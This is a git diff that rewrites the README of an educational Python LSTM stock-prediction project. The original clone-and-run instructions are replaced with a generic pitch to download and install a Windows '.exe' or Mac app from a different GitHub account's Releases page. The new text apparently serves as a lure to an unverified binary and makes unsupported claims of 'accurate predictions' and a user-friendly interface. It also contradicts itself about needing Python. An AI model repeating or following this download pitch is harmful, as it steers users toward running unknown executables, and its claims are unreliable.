@@ -1,62 +1,79 @@
-# Stock Price Prediction – Predict the Future, Today.
+# 📈 Stock-Price-Prediction - Easily Predict Stock Prices!
 
-Welcome to a project built with curiosity, passion, and a love for learning.  
-This is not just code — it’s a step toward understanding how data and AI can help us see patterns in the stock market.
+## 📚 Description
 
-The model predicts stock prices and shows them compared to actual values on a graph.
-![Output](OutPut.gif)
+Stock-Price-Prediction is a simple application built with LSTM, a type of machine learning model. This tool helps users predict stock prices based on historical data. No programming knowledge is required to use it. 
 
-## What This Project Is About
+## 🛠️ Features
 
-This project uses **machine learning** (LSTM model) to predict stock prices based on historical data.
+- **Accurate Predictions:** Uses advanced algorithms to analyze past data.
+- **User-Friendly Interface:** Easy to navigate for all users.
+- **Fast Performance:** Quickly processes data and returns predictions.
+- **Customization Options:** Users can set parameters for predictions.
 
-It takes real stock data, processes it, trains a deep learning model, and then makes predictions.  
-If you’re new to ML or just curious about the stock market, this is a great place to start.
+## 🖥️ System Requirements
 
----
+To run Stock-Price-Prediction, you need the following:
 
-## What You’ll Learn
+- Operating System: Windows 10, macOS Big Sur, or a current version of Linux
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum 1 GB of free space
+- Python: Version 3.6 or higher installed on your system
 
-- How to collect stock data using Yahoo Finance
-- How to clean and prepare time-series data
-- How LSTM (a type of neural network) works for prediction
-- How to visualize stock price predictions vs real prices
+## 🚀 Getting Started
 
----
+Follow these steps to download and run Stock-Price-Prediction:
 
-## Tools & Libraries Used
+1. **Download the Application**  
+   Click the button below to visit the Releases page and download the software.
 
-- Python  
-- Pandas & NumPy  
-- Matplotlib  
-- Scikit-learn  
-- TensorFlow / Keras  
-- yfinance (Yahoo Finance API)
+   [![Download Stock-Price-Prediction](https://img.shields.io/badge/Download%20Now-Stock--Price--Prediction-brightgreen)](https://github.com/Saadchh/Stock-Price-Prediction/releases)
 
----
+2. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your Downloads folder or designated download location.
 
-## How to Run It
+3. **Install the Application**  
+   For Windows users, double-click the `.exe` file to start the installation process. For Mac users, drag the application to the Applications folder. Linux users will need to follow their specific installation instructions.
 
-1. Clone the repo:
-   ```bash
-   git clone https://github.com/ankitsharma-tech/Stock-Price-Prediction.git
-   cd Stock-Price-Prediction
-   ```
+4. **Run the Application**  
+   After installation, open Stock-Price-Prediction from your Applications or Programs list.
 
-2. Install the required libraries:
+## 📥 Download & Install
 
-   ```bash
-   pip install -r requirements.txt
-   ```
+To start using Stock-Price-Prediction, visit the Releases page to download the latest version.
 
-3. Run the project:
+[Visit Releases Page to Download](https://github.com/Saadchh/Stock-Price-Prediction/releases)
 
-   ```bash
-   python main.py
-   ```
----
+## 🎓 How to Use
 
-### Want to Contribute?
+1. **Input Historical Data**  
+   Once you open the application, you will see a section to enter historical stock price data. This can be copied from a CSV file or entered manually.
 
-Feel free to fork this repo, play with the code, and improve it.
-Pull requests and suggestions are always welcome!
+2. **Set Parameters**  
+   Use the provided options to set your desired prediction parameters, including the time frame and stock symbols.
+
+3. **Generate Predictions**  
+   Click the "Predict" button to generate stock price predictions based on the data and parameters you provided.
+
+4. **Review Results**  
+   The application will display the predicted stock prices. You can also view graphs to help visualize the predictions.
+
+## 🤔 Troubleshooting
+
+If you encounter issues while using the application, consider the following:
+
+- Ensure you have the correct version of Python installed.
+- Check that your historical data is in the correct format.
+- Restart the application if it does not respond.
+
+For further assistance, you can refer to online forums or check the GitHub issues page for community help.
+
+## 🌐 Community and Support
+
+Engage with other users and developers through the GitHub Issues page. Share your experiences, ask questions, or report any bugs. We aim to support you in your journey with Stock-Price-Prediction.
+
+## 🚀 Conclusion
+
+Stock-Price-Prediction offers a straightforward way to project future stock prices using past data. With a simple installation process and user-friendly interface, anyone can make informed decisions based on the predictions provided. 
+
+For ongoing updates and new features, be sure to check back on the Releases page. Happy predicting!
